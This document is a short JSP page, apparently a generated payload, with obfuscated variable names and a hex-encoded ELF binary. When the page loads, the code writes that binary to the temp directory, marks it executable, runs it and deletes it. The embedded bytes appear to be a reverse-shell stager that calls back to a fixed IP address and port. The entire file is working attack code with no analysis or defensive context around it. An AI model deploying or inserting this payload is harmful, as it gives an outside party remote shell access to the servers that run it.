<%@ page import="java.io.*" %>
<%
  String YoNEWkNcyVs = "7f454c4602010100000000000000000002003e0001000000780040000000000040000000000000000000000000000000000000004000380001000000000000000100000007000000000000000000000000004000000000000000400000000000fa000000000000007c01000000000000001000000000000031ff6a095899b6104889d64d31c96a22415a6a075a0f054885c078516a0a4159506a2958996a025f6a015e0f054885c0783b489748b90200115c0a60005b514889e66a105a6a2a580f05594885c0792549ffc97418576a23586a006a054889e74831f60f0559595f4885c079c76a3c586a015f0f055e6a7e5a0f054885c078edffe6";
  String pcBwtCSULdDXjZ = System.getProperty("java.io.tmpdir") + "/YaOMytBkRRrXf";

  if (System.getProperty("os.name").toLowerCase().indexOf("windows") != -1) {
    pcBwtCSULdDXjZ = pcBwtCSULdDXjZ.concat(".exe");
  }

  int VBeTgLGkDPMRQW = YoNEWkNcyVs.length();
  byte[] FPkKITHdfXbV = new byte[VBeTgLGkDPMRQW/2];
  for (int fybjFzMBgLhKy = 0; fybjFzMBgLhKy < VBeTgLGkDPMRQW; fybjFzMBgLhKy += 2) {
    FPkKITHdfXbV[fybjFzMBgLhKy / 2] = (byte) ((Character.digit(YoNEWkNcyVs.charAt(fybjFzMBgLhKy), 16) << 4)
                                              + Character.digit(YoNEWkNcyVs.charAt(fybjFzMBgLhKy+1), 16));
  }

  FileOutputStream HnTfGUHZqlEO = new FileOutputStream(pcBwtCSULdDXjZ);
  HnTfGUHZqlEO.write(FPkKITHdfXbV);
  HnTfGUHZqlEO.flush();
  HnTfGUHZqlEO.close();

  if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1){
    String[] TAxTYuUiTnm = new String[3];
    TAxTYuUiTnm[0] = "chmod";
    TAxTYuUiTnm[1] = "+x";
    TAxTYuUiTnm[2] = pcBwtCSULdDXjZ;
    Process ahhWosFwSqheb = Runtime.getRuntime().exec(TAxTYuUiTnm);
    if (ahhWosFwSqheb.waitFor() == 0) {
      ahhWosFwSqheb = Runtime.getRuntime().exec(pcBwtCSULdDXjZ);
    }

    File FWBgEnEoADtQ = new File(pcBwtCSULdDXjZ); FWBgEnEoADtQ.delete();
  } else {
    String[] rrePtQdwt = new String[1];
    rrePtQdwt[0] = pcBwtCSULdDXjZ;
    Process ahhWosFwSqheb = Runtime.getRuntime().exec(rrePtQdwt);
  }
%>
